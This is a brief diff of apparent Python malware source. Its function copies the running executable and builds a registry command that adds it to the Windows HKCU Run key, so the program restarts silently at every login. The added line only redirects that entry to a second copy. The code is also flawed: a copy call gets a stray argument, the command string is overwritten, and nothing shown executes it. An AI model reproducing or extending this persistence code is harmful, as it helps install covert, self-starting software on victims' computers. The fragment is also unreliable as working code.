@@ -20,6 +20,7 @@ def regeditEkle():
     if not os.path.exists(yeniDosya):
         shutil.copyfile(sys.executable,yeniDosya, yeniDosya2)
         regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v REG_SZ /d " +yeniDosya
+        regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v REG_SZ /d " +yeniDosya2
 
 regeditEkle()
 
